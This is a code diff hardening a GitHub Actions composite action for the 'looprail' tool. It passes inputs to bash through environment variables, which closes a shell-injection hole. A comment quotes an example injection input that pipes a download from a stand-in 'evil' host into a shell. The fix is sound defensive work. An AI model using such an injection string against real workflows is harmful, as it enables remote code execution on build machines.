@@ -45,18 +45,27 @@ outputs:
 runs:
   using: 'composite'
   steps:
+    # Inputs reach the shell ONLY through env vars, never by ${{ }}
+    # interpolation inside run: - interpolated input text becomes shell
+    # source verbatim, so a crafted input like `"; curl evil | sh` would
+    # execute. env-var indirection keeps input strings data, not code.
     - name: Install looprail
       shell: bash
-      run: npm install -g looprail@${{ inputs.version }}
+      env:
+        LOOPRAIL_VERSION: ${{ inputs.version }}
+      run: npm install -g "looprail@$LOOPRAIL_VERSION"
 
     - name: Run the loop
       id: run
       shell: bash
       working-directory: ${{ inputs.working-directory }}
+      env:
+        LOOPFILE: ${{ inputs.loopfile }}
+        AUTO_APPROVE: ${{ inputs.auto-approve }}
       run: |
         set +e
-        ARGS=(run "${{ inputs.loopfile }}" --json)
-        if [ "${{ inputs.auto-approve }}" = "true" ]; then
+        ARGS=(run "$LOOPFILE" --json)
+        if [ "$AUTO_APPROVE" = "true" ]; then
           ARGS+=(--yes)
         fi
         OUTPUT="$(looprail "${ARGS[@]}")"
